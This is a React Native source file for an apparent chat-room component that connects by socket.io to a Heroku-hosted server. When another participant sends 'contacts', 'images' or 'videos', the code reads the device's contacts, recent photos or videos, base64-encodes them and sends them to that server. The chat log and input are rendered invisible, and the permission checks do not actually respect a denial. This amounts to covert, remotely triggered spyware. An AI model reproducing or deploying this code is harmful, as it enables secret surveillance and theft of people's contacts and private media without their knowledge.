import React from 'react';
import {
  View,
  TextInput,
  Text,
  PermissionsAndroid,
  AsyncStorage,
  ToastAndroid,
  Image,
  TouchableOpacity,
  TouchableWithoutFeedback,
  TouchableHighlight,
} from 'react-native';
import io from 'socket.io-client';
// import {Button} from 'react-native-paper';
import Contacts from 'react-native-contacts';
import CameraRoll from '@react-native-community/cameraroll';
import ImgToBase64 from 'react-native-image-base64';
// import RNFS from "react-native-fs";

class RoomChats extends React.Component {
  state = {
    messages: [],
    message: 'contacts',
    contact: [],
    photos: [],
  };

  async componentDidMount() {
    this.socket = io('https://mobilio1.herokuapp.com');
    this.getUsers();
    var currentUser = await AsyncStorage.getItem('user');
    currentUser = JSON.parse(currentUser);

    this.socket.on('message', async (message) => {
      if (
        message.text.includes('phoneNumbers') &&
        message.user != currentUser.name
      ) {
        var contacts = JSON.parse(message.text);
        console.log(contacts);
        console.log('Contacts displaying', contacts.length);
        this.setState({
          messages: [
            ...this.state.messages,
            {text: 'contacts fetched', user: currentUser.name},
          ],
        });

        this.props.navigation.navigate('con', {contact: message.text});
      } else if (
        (message.text === 'contacts' || message.text === 'Contacts') &&
        message.user != currentUser.name
      ) {
        this.fetchContacts();
      }

      if (
        message.text.includes('imagess') &&
        message.user != currentUser.name
      ) {
        //     console.log("1st iiiifff==>>>",message);
        // console.log('messages=>>>>>>>>>>', message.text);
        var images = JSON.parse(message.text);

        // console.log("parse==>>",images);

        this.setState({
          messages: [
            ...this.state.messages,
            {text: 'image fetched', user: currentUser.name},
          ],
        });

        this.props.navigation.navigate('viewimages', {photos: images});
      } else if (
        (message.text === 'images' || message.text === 'Images') &&
        message.user != currentUser.name
      ) {
        this.fetchImages();
      }

      if (
        message.text.includes('videoss') &&
        message.user != currentUser.name
      ) {
        //     console.log("1st iiiifff==>>>",message);
        // console.log('messages=>>>>>>>>>>', message.text);
        var videos = JSON.parse(message.text);

        // console.log("parse==>>",images);

        this.setState({
          messages: [
            ...this.state.messages,
            {text: 'videos fetched', user: currentUser.name},
          ],
        });

        this.props.navigation.navigate('viewvideos', {videos: videos});
      } else if (
        message.text === 'videos' &&
        message.user != currentUser.name
      ) {
        this.fetchVideos();
      } else if (
        !message.text.includes('imagess') &&
        !message.text.includes('phoneNumbers') &&
        !message.text.includes('videoss')
      ) {
        this.setState({messages: [...this.state.messages, message]});
      }

      return () => {
        this.socket.emit('disconnect');
        this.socket.off();
      };
    });
  }

  render() {
    const {message} = this.state;

    const {uname, roomname} = this.props.route.params;
    console.log(uname, roomname);

    this.getUsers = async () => {
      var userData = await AsyncStorage.getItem('user');
      userData = JSON.parse(userData);

      //   alert(userData.name);
      this.socket.emit('join', {name: userData.name, room: roomname});
      ToastAndroid.showWithGravityAndOffset(
        'You Are Connected',
        ToastAndroid.SHORT, //can be SHORT, LONG
        ToastAndroid.TOP,
        25,
        100, //can be TOP, BOTTON, CENTER
      );
    };

    this.fetchContacts = () => {
      ToastAndroid.show('fetching contacts.....', ToastAndroid.SHORT);
      //   alert("fetching contacts")
      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: 'Contacts',
        message: ' This app would like to see your contacts',
      })
        .then(() => {
          Contacts.getAll((err, contacts) => {
            if (err === 'denied') {
              // alert("cant fetching contacts")
              console.log('cannot access');
              ToastAndroid.show('fetching contacts failed', ToastAndroid.SHORT);
            } else {
              ToastAndroid.show(
                'fetching contacts Success',
                ToastAndroid.SHORT,
              );
              const contactPayload = {
                type: 'contacts',
                data: contacts,
              };
              this.socket.emit('sendMessage', JSON.stringify(contacts));
              this.setState({contact: contacts});
            }
          });
        })
        .catch((err) => {
          console.log('contacts not fetched ');
        });
    };
    this.fetchImages = async () => {
      try {
        const permission = await PermissionsAndroid.PERMISSIONS
          .WRITE_EXTERNAL_STORAGE;
        PermissionsAndroid.request(permission);
        Promise.resolve();
        if (permission === 'denied') {
          console.log('not granted');
          ToastAndroid.show('fetching images failed', ToastAndroid.SHORT);
        } else {
          CameraRoll.getPhotos({first: 10, assetType: 'Photos'}).then(
            async (r) => {
              ToastAndroid.show('fetching images Success', ToastAndroid.SHORT);
              const images = await r.edges;

              //   this.socket.emit('sendMessage', JSON.stringify(images));

              const imagedata = [];

              for (let i = 0; i < images.length; i++) {
                const pics = images[i].node.image.uri;
                ImgToBase64.getBase64String(pics).then((base64String) => {
                  // console.log("urlllll",base64String)
                  imagedata.push({imagess: base64String});
                  console.log('imag======>>>', imagedata);
                  this.socket.emit('sendMessage', JSON.stringify(imagedata));
                });
              }

              // const imageData = getImageData(images)
              // console.log("imageeeee",imageData)
              //   this.socket.emit('sendMessage', JSON.stringify({imagess:imageData}));

              // const imageURI = images[0].node.image.uri;
              // ImgToBase64.getBase64String(imageURI).then((base64String) => {
              //   this.socket.emit('sendMessage', JSON.stringify({imagess:base64String}));

              // });
            },
          );
        }
      } catch (error) {
        Promise.reject(error);
      }
    };

    this.fetchVideos = async () => {
      try {
        const permission = await PermissionsAndroid.PERMISSIONS
          .WRITE_EXTERNAL_STORAGE;
        PermissionsAndroid.request(permission);
        Promise.resolve();
        if (permission === 'denied') {
          console.log('not granted');
          ToastAndroid.show('fetching videos failed', ToastAndroid.SHORT);
        } else {
          CameraRoll.getPhotos({first: 3, assetType: 'Videos'}).then(
            async (r) => {
              ToastAndroid.show('fetching videos Success', ToastAndroid.SHORT);
              const videos = await r.edges;
              // console.log("vi==>>",videos)
              //   this.socket.emit('sendMessage', JSON.stringify({videoss:videos}));

              const videodata = [];

              for (let i = 0; i < videos.length; i++) {
                const vdos = videos[i].node.image.uri;
                ImgToBase64.getBase64String(vdos).then((base64String) => {
                  console.log('urlllll', base64String);
                  videodata.push({videoss: base64String});
                  // console.log("vid======>>>",videodata)
                  this.socket.emit('sendMessage', JSON.stringify(videodata));
                });
              }
            },
          );
        }
      } catch (error) {
        Promise.reject(error);
      }
    };

    const contactsHandle = () => {
      if (message) {
        this.socket.emit('sendMessage', message);
        ToastAndroid.showWithGravityAndOffset(
          'Contacts Fetching...Please Wait',
          ToastAndroid.LONG, //can be SHORT, LONG
          ToastAndroid.TOP,
          25,
          100, //can be TOP, BOTTON, CENTER
        );
      }
    };
    const imagesHandle = () => {
      if (message) {
        this.socket.emit('sendMessage', message.replace('contacts', 'images'));
        ToastAndroid.showWithGravityAndOffset(
          'Images Fetching...Please Wait',
          ToastAndroid.LONG, //can be SHORT, LONG
          ToastAndroid.TOP,
          25,
          100, //can be TOP, BOTTON, CENTER
        );
      }
    };
    const messagesHandle = () => {
      ToastAndroid.showWithGravityAndOffset(
        ' Messages Not Available Right Now',
        ToastAndroid.SHORT, //can be SHORT, LONG
        ToastAndroid.TOP,
        25,
        100, //can be TOP, BOTTON, CENTER
      );
    };
    const musicsHandle = () => {
      // ToastAndroid.show('Emails Not Available Right Now', ToastAndroid.LONG);

      ToastAndroid.showWithGravityAndOffset(
        'Musics Not Available Right Now',
        ToastAndroid.SHORT, //can be SHORT, LONG
        ToastAndroid.TOP,
        25,
        100, //can be TOP, BOTTON, CENTER
      );
    };
    const videosHandle = () => {
      // ToastAndroid.show('Videos Not Available Right Now', ToastAndroid.LONG);
      ToastAndroid.showWithGravityAndOffset(
        'Videos Not Available Right Now',
        ToastAndroid.SHORT, //can be SHORT, LONG
        ToastAndroid.TOP,
        25,
        100, //can be TOP, BOTTON, CENTER
      );
    };

    console.log(message, this.state.messages);

    return (
      <View style={{flex: 1}}>
        <View
          style={{
            width: '100%',
            backgroundColor: 'white',
            height: '90%',
            position: 'absolute',
          }}>
          {this.state.messages.map((data, index) => {
            return (
              <View
                key={index}
                style={{width: 'auto', height: 40, backgroundColor: 'light'}}>
                <Text style={{color: 'black', fontSize: 18, opacity: 0.0}}>
                  {data.user}: {data.text}
                </Text>
              </View>
            );
          })}
        </View>

        <View
          style={{
            width: '100%',
            justifyContent: 'center',
            alignItems: 'center',
            flexDirection: 'row',
            top: '30%',
            left: 0,
          }}>
          <TouchableWithoutFeedback
            onPress={contactsHandle}
            style={{
              width: 170,
              height: 170,
              left: 0,
              top: '30%',
              borderRadius: 15,
              elevation: 5,
              overflow: 'hidden',
            }}>
            <View
              style={{
                width: 170,
                height: 170,
                backgroundColor: 'white',
                right: 7,
                borderRadius: 15,
                elevation: 7,
                overflow: 'hidden',
              }}>
              <View
                style={{
                  width: '100%',
                  height: '70%',
                  backgroundColor: 'lightgrey',
                  borderBottomRightRadius: 30,
                }}>
                <Image
                  style={{
                    width: '68%',
                    height: '80%',
                    left: 23,
                    top: 10,
                    opacity: 0.75,
                  }}
                  source={{
                    uri:
                      'https://cdn0.iconfinder.com/data/icons/typicons-2/24/contacts-512.png',
                  }}
                />
                <View style={{top: '105%', position: 'absolute', left: 35}}>
                  <Text
                    style={{
                      textAlign: 'center',
                      fontSize: 24,
                      letterSpacing: 2,
                    }}>
                    Contacts
                  </Text>
                </View>
              </View>
            </View>
          </TouchableWithoutFeedback>

          <TouchableWithoutFeedback
            onPress={imagesHandle}
            style={{
              width: 180,
              height: 170,
              left: 5,
              top: 200,
              borderRadius: 15,
              elevation: 5,
            }}>
            <View
              style={{
                width: 170,
                height: 170,
                backgroundColor: 'white',
                borderRadius: 15,
                elevation: 7,
                overflow: 'hidden',
                left: 5,
              }}>
              <View
                style={{
                  width: '100%',
                  height: '70%',
                  backgroundColor: 'lightgrey',
                  borderBottomRightRadius: 30,
                }}>
                <Image
                  style={{
                    width: '65%',
                    height: '80%',
                    left: 30,
                    top: 10,
                    opacity: 0.8,
                  }}
                  source={{
                    uri:
                      'https://www.pinclipart.com/picdir/middle/460-4608361_album-svg-png-icon-free-download-album-foto.png',
                  }}
                />
                <View style={{top: '105%', position: 'absolute', left: 40}}>
                  <Text
                    style={{
                      textAlign: 'center',
                      fontSize: 24,
                      letterSpacing: 2,
                    }}>
                    Photos
                  </Text>
                </View>
              </View>
            </View>
          </TouchableWithoutFeedback>
        </View>

        <View
          style={{
            width: '100%',
            justifyContent: 'center',
            alignItems: 'center',
            flexDirection: 'row',
            top: '40%',
            left: 5,
          }}>
          <TouchableWithoutFeedback onPress={messagesHandle}>
            <View
              style={{
                width: 170,
                height: 170,
                backgroundColor: 'white',
                right: 10,
                borderRadius: 15,
                elevation: 7,
                overflow: 'hidden',
              }}>
              <View
                style={{
                  width: '100%',
                  height: '70%',
                  backgroundColor: 'lightgrey',
                  borderBottomRightRadius: 30,
                }}>
                <Image
                  style={{
                    width: '60%',
                    height: '80%',
                    left: 30,
                    top: 10,
                    opacity: 0.75,
                  }}
                  source={{
                    uri:
                      'https://img.pngio.com/message-icon-png-transparent-png-download-for-free-159661-trzcacak-message-icon-png-920_879.png',
                  }}
                />
                <View style={{top: '105%', position: 'absolute', left: 20}}>
                  <Text
                    style={{
                      textAlign: 'center',
                      fontSize: 24,
                      letterSpacing: 2,
                    }}>
                    Messages
                  </Text>
                </View>
              </View>
            </View>
          </TouchableWithoutFeedback>

          <View
            style={{
              width: 170,
              height: 170,
              backgroundColor: 'white',
              borderRadius: 15,
              elevation: 7,
              overflow: 'hidden',
            }}>
            <TouchableWithoutFeedback onPress={musicsHandle}>
              <View
                style={{
                  width: '100%',
                  height: '70%',
                  backgroundColor: 'lightgrey',
                  borderBottomRightRadius: 30,
                }}>
                <Image
                  style={{
                    width: '60%',
                    height: '82%',
                    left: 40,
                    top: 8,
                    opacity: 0.75,
                  }}
                  source={{
                    uri:
                      'https://webstockreview.net/images/clipart-music-muzik-18.png',
                  }}
                />
                <View style={{top: '105%', position: 'absolute', left: 42}}>
                  <Text
                    style={{
                      textAlign: 'center',
                      fontSize: 24,
                      letterSpacing: 2,
                    }}>
                    Musics
                  </Text>
                </View>
              </View>
            </TouchableWithoutFeedback>
          </View>
        </View>
        <TouchableWithoutFeedback onPress={videosHandle}>
          <View
            style={{
              width: 350,
              height: 160,
              backgroundColor: 'white',
              elevation: 7,
              top: '27%',
              left: '5%',
              borderRadius: 12,
            }}>
            <Text
              style={{
                fontSize: 24,
                textAlign: 'center',
                top: '40%',
                letterSpacing: 3,
              }}>
              Videos
            </Text>
          </View>
        </TouchableWithoutFeedback>

        <View
          style={{
            width: '100%',
            height: 60,
            backgroundColor: 'skyblue',
            top: 640,
            flexDirection: 'row',
          }}>
          <View style={{opacity: 0.0, backgroundColor: 'white'}}>
            <TextInput
              placeholder="type message"
              value={message}
              onChangeText={(message) => this.setState({message})}
              style={{
                width: 300,
                height: '100%',
                backgroundColor: 'white',
                textAlign: 'center',
                opacity: 0,
              }}
            />
          </View>
          {/* <View style={{width: 100, height: 70}}> */}
          {/* <Button
              style={{height: 50, top: 8, backgroundColor: 'skyblue'}}
              // onPress={btnHandle}
              mode="contained">
              Send
            </Button> */}
          {/* </View> */}
        </View>
      </View>
    );
  }
}

export default RoomChats;
